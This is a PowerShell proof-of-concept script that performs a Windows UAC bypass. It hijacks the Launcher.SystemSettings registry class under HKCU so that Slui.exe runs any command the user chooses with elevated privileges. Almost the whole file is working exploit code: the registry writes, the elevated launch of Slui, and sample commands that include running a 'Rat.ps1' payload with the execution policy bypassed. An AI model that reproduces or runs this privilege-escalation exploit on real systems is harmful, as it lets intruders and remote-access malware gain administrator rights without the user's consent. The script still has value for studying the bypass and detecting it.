<#
.Author:
   @r00t-3xp10it - version 1.2

.Disclosure:
   @mattharr0ey
   https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b

.DESCRIPTION:
   How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
   called Windows Activation in SystemSettings, this service makes it easy for you and other users to change an old windows
   activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
   ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
   but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
   powershell.exe start-process slui.exe -verb runas
   
.TESTED UNDER:
   Windows 10 - SO 18363.778

.EXECUTION:
   Set-ExecutionPolicy Unrestricted -Scope CurrentUser
   powershell.exe -File SluiPOC.ps1
   - Command: C:\Windows\System32\cmd.exe

#>


$Banner = @"
 _______  ___      __   __  ___     _______  _______  _______ 
|       ||   |    |  | |  ||   |    |       ||       ||       |
|  _____||   |    |  | |  ||   |    |    _  ||   _   ||       |
| |_____ |   |    |  |_|  ||   |    |   |_| ||  | |  ||       |
|_____  ||   |___ |       ||   |    |    ___||  |_|  ||      _|
 _____| ||       ||       ||   |    |   |    |       ||     |_ 
|_______||_______||_______||___|    |___|    |_______||_______|
  Disclosure:@mattharr0ey * Author:@r00t-3xp10it - SSAredTeam
  - Privilege Escalation - Uac Bypass in ChangePK (Slui.exe) -


 Some Examples:
    - Command: powershell.exe
    - Command: cmd.exe /c start calc.exe
    - Command: C:\Windows\System32\cmd.exe
    - Command: powershell.exe -exec bypass -File `$env:tmp\Rat.ps1
    - Command: help (for Slui uac bypass POC description)

"@;

Clear-Host;
$IPath = pwd;
$Choise = $Null;
$Command = $Null;
Write-Host $Banner;

## User Input Land ..
Write-Host "`n - Command: " -NoNewline -ForeGroundColor Green;
$Command = Read-Host;
If(-not($Command) -or $Command -eq "help")
{
  write-host "`n This Script Allows us to elevate shell privileges (cmd or ps)";
  write-host " by hijacking the execution of an signed microsoft binary (Slui.exe)";
  write-host " in registry (HKCU hive) to spawn an high privilege prompt shell (or binary)`n`n";
  write-host " How does Slui UAC bypass work? There is a tool named ChangePK in System32 that has a service that opens a window";
  write-host " (for you) called Windows Activation in SystemSettings, this service makes it easy for you and other users to";
  write-host " change an old windows activation key to a new one, the tool (ChangePK) doesn’t open itself with high privileges";
  write-host " but there is another tool that opens ChangePK with high privileges named sliu.exe Slui doesn’t support a feature";
  write-host " that runs it as administrator automatically, but we can do that manually by either clicking on slui with a right"
  write-host " click and sellect `“Run as administrator`” or using: powershell.exe start-process slui.exe -verb runas";
  write-host " DISCLOSURE: https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b" -ForeGroundColor Yellow;
  write-host "`n` - Press [ENTER] to continue script exec .. " -NoNewline;$sair = Read-Host;
  Clear-Host;Write-Host $Banner;
}


### Add Entrys to Regedit {powershell}
If(-not($Command) -or $Command -eq "help"){$Command = "cmd.exe";write-host "`n - Command: $Command"};
write-host " [i] Adding Entrys to Regedit (HKCU) .." -ForeGroundColor Green -BackGroundColor Black;
write-host "`n Registry Key" -ForegroundColor Green;
write-host " ------------";Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Seconds 1;
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shell";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Seconds 1;
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Seconds 1;
## The Next Registry entry allow us execute our command under high privileges - In this example we are calling 'cmd.exe' prompt
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shellex";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers" -Force|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen";
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Seconds 1;
write-host " HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}";
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;
New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Seconds 1;
Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1;


write-host "`n";
### Start vulnerable process {powershell}
write-host " [i] Start vulnerable process (Slui.exe) .." -ForeGroundColor Green -BackGroundColor Black;
Start-Sleep -Seconds 2;start-process "C:\Windows\System32\Slui.exe" -Verb runas;


Start-Sleep -Seconds 4;
### Revert Regedit to 'DEFAULT' settings after all testings done ..
Write-Host " - Do you wish to revert regedit to default settings? (y|n): " -NoNewline;
$Choise = Read-Host;
If($Choise -eq "y" -or $Choise -eq "Y" -or $Choise -eq "yes")
{
  write-host " [i] Reverting Regedit to 'DEFAULT' settings .." -ForeGroundColor Green -BackGroundColor Black;Start-Sleep -Seconds 2;
  Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1;
  Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1;
  Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force;Start-Sleep -Seconds 1;
  write-host " [i] Closing SluiPOC.ps1" -ForeGroundColor Green -BackGroundColor Black;write-host "`n";Start-Sleep -Seconds 2;
}else{
  write-host " [i] LogFile Stored: $IPath\SluiPOC.log" -ForeGroundColor Green -BackGroundColor Black;Start-Sleep -Seconds 2;
  echo "COMMAND TO BE EXECUTED: $Command" > $IPath\SluiPOC.log
  echo "TRIGGER COMMAND EXECUTION: powershell start-process `"C:\Windows\System32\Slui.exe`" -Verb runas" >> $IPath\SluiPOC.log
  write-host " [i] Closing SluiPOC.ps1" -ForeGroundColor Green -BackGroundColor Black;write-host "`n";Start-Sleep -Seconds 3;
}
Exit;
